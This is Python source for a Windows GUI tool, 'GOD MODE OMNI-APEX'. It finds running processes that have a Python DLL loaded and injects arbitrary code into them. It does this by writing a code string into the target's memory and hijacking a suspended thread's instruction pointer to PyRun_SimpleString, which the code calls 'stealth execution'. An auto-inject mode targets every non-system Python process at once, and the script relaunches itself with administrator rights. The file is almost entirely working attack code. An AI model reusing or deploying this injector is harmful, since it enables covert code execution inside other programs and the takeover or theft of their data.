import os
import sys
import time
import struct
import ctypes
import psutil
import threading
import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext, filedialog
from pathlib import Path
from ctypes import wintypes

# =============================================================================
# WIN64 TYPE DEFINITIONS (CRITICAL FOR STABILITY)
# =============================================================================
DWORD64 = ctypes.c_uint64
WORD = wintypes.WORD
DWORD = wintypes.DWORD

class CONTEXT64(ctypes.Structure):
    _pack_ = 16
    _fields_ = [
        ("P1Home", DWORD64), ("P2Home", DWORD64), ("P3Home", DWORD64),
        ("P4Home", DWORD64), ("P5Home", DWORD64), ("P6Home", DWORD64),
        ("ContextFlags", DWORD), ("MxCsr", DWORD),
        ("SegCs", WORD), ("SegDs", WORD), ("SegEs", WORD),
        ("SegFs", WORD), ("SegGs", WORD), ("SegSs", WORD),
        ("EFlags", DWORD), ("Dr0", DWORD64), ("Dr1", DWORD64),
        ("Dr2", DWORD64), ("Dr3", DWORD64), ("Dr6", DWORD64),
        ("Dr7", DWORD64), ("Rax", DWORD64), ("Rcx", DWORD64),
        ("Rdx", DWORD64), ("Rbx", DWORD64), ("Rsp", DWORD64),
        ("Rbp", DWORD64), ("Rsi", DWORD64), ("Rdi", DWORD64),
        ("R8", DWORD64), ("R9", DWORD64), ("R10", DWORD64),
        ("R11", DWORD64), ("R12", DWORD64), ("R13", DWORD64),
        ("R14", DWORD64), ("R15", DWORD64), ("Rip", DWORD64),
    ]

# Windows Constants
PROCESS_ALL_ACCESS = 0x1F0FFF
THREAD_ALL_ACCESS = 0x1FFFFF
MEM_COMMIT, MEM_RESERVE = 0x1000, 0x2000
PAGE_EXECUTE_READWRITE = 0x40
CONTEXT_FULL = 0x100000 | 0x01 | 0x02 | 0x08 

# =============================================================================
# THE APEX ENGINE: DETECTS PYTHON IN MEMORY
# =============================================================================

class ApexEngine:
    @staticmethod
    def is_python_process(pid):
        """Deep Scan: Checks if a process has a Python DLL loaded."""
        try:
            # Avoid scanning system processes for speed
            if pid <= 4: return None
            proc = psutil.Process(pid)
            for m in proc.memory_maps():
                path = m.path.lower()
                if "python" in path and path.endswith(".dll") and "pythoncom" not in path:
                    return os.path.basename(path)
        except (psutil.AccessDenied, psutil.NoSuchProcess):
            pass
        return None

    @staticmethod
    def find_python_export(pid, dll_name_hint=None):
        """Locates the PyRun_SimpleString address dynamically."""
        try:
            process = psutil.Process(pid)
            for m in process.memory_maps():
                path = m.path.lower()
                if "python" in path and path.endswith(".dll") and "pythoncom" not in path:
                    h_local = ctypes.windll.kernel32.LoadLibraryExW(path, None, 0x01)
                    addr = ctypes.windll.kernel32.GetProcAddress(h_local, b"PyRun_SimpleString")
                    offset = addr - h_local
                    remote_base = int(m.addr.split('-')[0], 16)
                    return remote_base + offset, os.path.basename(path)
            return None, None
        except: return None, None

    @classmethod
    def inject_ninja(cls, pid, code):
        """Ninja Mode: Context Hijacking (Stealth Execution)."""
        target_func, dll_name = cls.find_python_export(pid)
        if not target_func: return False, "Target doesn't appear to be a Python process."

        try:
            h_proc = ctypes.windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
            if not h_proc: return False, "Failed to open process."

            payload = code.encode('utf-8') + b'\x00'
            
            # 1. Allocate & Write
            remote_mem = ctypes.windll.kernel32.VirtualAllocEx(h_proc, 0, len(payload), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
            if not remote_mem: return False, "Memory allocation failed."
            
            ctypes.windll.kernel32.WriteProcessMemory(h_proc, remote_mem, payload, len(payload), 0)

            # 2. Hijack existing thread
            threads = [t.id for t in psutil.Process(pid).threads()]
            if not threads: return False, "No threads to hijack."
            
            h_thread = ctypes.windll.kernel32.OpenThread(THREAD_ALL_ACCESS, False, threads[0])
            if not h_thread: return False, "Failed to open thread."

            ctypes.windll.kernel32.SuspendThread(h_thread)
            
            ctx = CONTEXT64()
            ctx.ContextFlags = CONTEXT_FULL
            ctypes.windll.kernel32.GetThreadContext(h_thread, ctypes.byref(ctx))
            
            ctx.Rcx = remote_mem # Set 1st argument (the code)
            ctx.Rip = target_func # Point instruction pointer to PyRun_SimpleString
            
            ctypes.windll.kernel32.SetThreadContext(h_thread, ctypes.byref(ctx))
            ctypes.windll.kernel32.ResumeThread(h_thread)
            
            # Cleanup handles
            ctypes.windll.kernel32.CloseHandle(h_thread)
            ctypes.windll.kernel32.CloseHandle(h_proc)

            return True, f"NINJA SUCCESS: Code running in {dll_name}"
        except Exception as e:
            return False, f"Injection Error: {e}"

# =============================================================================
# GUI INTERFACE (WITH AUTO-PYTHON FILTER)
# =============================================================================

class ApexApp:
    def __init__(self, root):
        self.root = root
        self.root.title("GOD MODE OMNI-APEX (AUTO-DETECTION ENABLED)")
        self.root.geometry("950x800")
        self.root.configure(bg="#050505")
        
        self.hook_path = tk.StringVar(value="__hook__.py")
        if not os.path.exists(self.hook_path.get()):
            Path(self.hook_path.get()).write_text("import ctypes; ctypes.windll.user32.MessageBoxW(0, 'Injected!', 'Apex', 0)")

        self.setup_ui()
        self.refresh_list()

    def setup_ui(self):
        # 1. Filter Bar
        f_top = tk.Frame(self.root, bg="#050505")
        f_top.pack(fill=tk.X, padx=10, pady=5)
        tk.Label(f_top, text="SEARCH / FILTER:", bg="#050505", fg="#00ff00", font=("Consolas", 10)).pack(side=tk.LEFT)
        self.search = tk.Entry(f_top, bg="#111", fg="white", insertbackground="white", font=("Consolas", 11))
        self.search.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=10)
        self.search.bind("<KeyRelease>", lambda e: self.refresh_list())

        # 2. Process List
        style = ttk.Style()
        style.theme_use('clam')
        style.configure("Treeview", background="#0a0a0a", foreground="#ffffff", fieldbackground="#0a0a0a", borderwidth=0)
        style.map("Treeview", background=[('selected', '#cc4400')], foreground=[('selected', 'white')])
        
        self.tree = ttk.Treeview(self.root, columns=("PID", "Name", "PythonEngine", "Path"), show='headings')
        self.tree.heading("PID", text="PID")
        self.tree.heading("Name", text="PROCESS NAME")
        self.tree.heading("PythonEngine", text="PYTHON DETECTED")
        self.tree.heading("Path", text="EXECUTABLE PATH")
        
        # Color Tags for Python Auto-Detection
        self.tree.tag_configure('python_found', foreground='#00ff00', font=('Segoe UI', 9, 'bold'))
        self.tree.pack(fill=tk.BOTH, expand=True, padx=10)

        # 3. Hook Controls
        f_hook = tk.Frame(self.root, bg="#050505")
        f_hook.pack(fill=tk.X, padx=10, pady=10)
        tk.Entry(f_hook, textvariable=self.hook_path, bg="#111", fg="#00ff00").pack(side=tk.LEFT, fill=tk.X, expand=True)
        tk.Button(f_hook, text="EDIT HOOK", command=self.open_editor, bg="#004466", fg="white").pack(side=tk.RIGHT, padx=5)

        # 4. Action Buttons
        f_actions = tk.Frame(self.root, bg="#050505")
        f_actions.pack(fill=tk.X, padx=10, pady=10)

        # Single Inject
        self.btn = tk.Button(f_actions, text="⚡ EXECUTE NINJA INJECTION (SINGLE) ⚡", command=self.go, 
                             bg="#cc4400", fg="white", font=("Impact", 12), height=2)
        self.btn.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 5))

        # Auto Inject
        self.auto_btn = tk.Button(f_actions, text="🌊 ACTIVATE AUTO-INJECT WAVE 🌊", command=self.run_auto_inject, 
                                  bg="#4400cc", fg="white", font=("Impact", 12), height=2)
        self.auto_btn.pack(side=tk.RIGHT, fill=tk.X, expand=True, padx=(5, 0))

    def refresh_list(self):
        """Auto-filtering + Auto-Python Detection Logic."""
        for i in self.tree.get_children(): self.tree.delete(i)
        q = self.search.get().lower()
        
        all_procs = list(psutil.process_iter(['pid', 'name', 'exe']))
        
        for p in all_procs:
            try:
                name = p.info['name']
                pid = p.info['pid']
                exe = p.info['exe'] or ""
                
                if not q or q in name.lower():
                    # AUTO-DETECT FEATURE:
                    py_dll = ApexEngine.is_python_process(pid)
                    tag = 'python_found' if py_dll else ''
                    self.tree.insert("", tk.END, values=(pid, name, py_dll if py_dll else "No", exe), tags=(tag,))
            except: continue

    def open_editor(self):
        ed = tk.Toplevel(self.root)
        ed.title("Hook Editor")
        ed.geometry("700x500")
        txt = scrolledtext.ScrolledText(ed, bg="#111", fg="white", font=("Consolas", 10))
        txt.pack(fill=tk.BOTH, expand=True)
        if os.path.exists(self.hook_path.get()):
            txt.insert('1.0', Path(self.hook_path.get()).read_text(errors='ignore'))
        tk.Button(ed, text="SAVE", command=lambda: Path(self.hook_path.get()).write_text(txt.get('1.0', tk.END))).pack(fill=tk.X)

    def go(self):
        sel = self.tree.selection()
        if not sel: return
        pid = int(self.tree.item(sel[0])['values'][0])
        code = Path(self.hook_path.get()).read_text(errors='ignore')
        
        def _task():
            self.btn.config(text="PENETRATING...", state=tk.DISABLED)
            success, msg = ApexEngine.inject_ninja(pid, code)
            messagebox.showinfo("Result", msg)
            self.btn.config(text="⚡ EXECUTE NINJA INJECTION (SINGLE) ⚡", state=tk.NORMAL)

        threading.Thread(target=_task, daemon=True).start()

    def run_auto_inject(self):
        """
        Auto Inject Mode:
        1. Filters out self.
        2. Filters out default install directories (Program Files, Windows, etc).
        3. Injects into everything else that has Python loaded.
        """
        if not messagebox.askyesno("Confirm Auto-Inject", "This will attempt to inject code into ALL detected Python processes excluding system/default apps.\n\nContinue?"):
            return

        code = Path(self.hook_path.get()).read_text(errors='ignore')
        my_pid = os.getpid()

        # Define directories to ignore
        ignore_dirs = [
            os.environ.get('ProgramFiles', 'C:\\Program Files').lower(),
            os.environ.get('ProgramFiles(x86)', 'C:\\Program Files (x86)').lower(),
            os.environ.get('SystemRoot', 'C:\\Windows').lower(),
            os.path.join(os.environ.get('LOCALAPPDATA', ''), 'programs').lower() 
        ]
        # Remove empty entries if env vars are missing
        ignore_dirs = tuple([d for d in ignore_dirs if d])

        def _auto_task():
            self.auto_btn.config(text="SCANNING & INJECTING...", state=tk.DISABLED, bg="#333")
            
            targets = []
            
            # 1. Scan Phase
            for p in psutil.process_iter(['pid', 'name', 'exe']):
                try:
                    pid = p.info['pid']
                    exe_path = (p.info['exe'] or "").lower()
                    
                    # Filter: Self
                    if pid == my_pid:
                        continue

                    # Filter: Default Installs
                    if exe_path.startswith(ignore_dirs):
                        continue

                    # Filter: Must be Python
                    if ApexEngine.is_python_process(pid):
                        targets.append((pid, p.info['name']))
                        
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue

            # 2. Attack Phase
            results = []
            for pid, name in targets:
                success, msg = ApexEngine.inject_ninja(pid, code)
                status = "SUCCESS" if success else "FAILED"
                results.append(f"[{status}] {name} ({pid}): {msg}")
                time.sleep(0.1) # Small delay to prevent system lockup

            # 3. Report
            self.root.after(0, lambda: self.auto_btn.config(text="🌊 ACTIVATE AUTO-INJECT WAVE 🌊", state=tk.NORMAL, bg="#4400cc"))
            
            summary = "\n".join(results) if results else "No valid targets found matching criteria."
            self.root.after(0, lambda: messagebox.showinfo("Auto-Inject Report", f"Processed {len(targets)} targets.\n\n{summary}"))

        threading.Thread(target=_auto_task, daemon=True).start()

if __name__ == "__main__":
    if not ctypes.windll.shell32.IsUserAnAdmin():
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit()

    root = tk.Tk()
    app = ApexApp(root)
    root.mainloop()
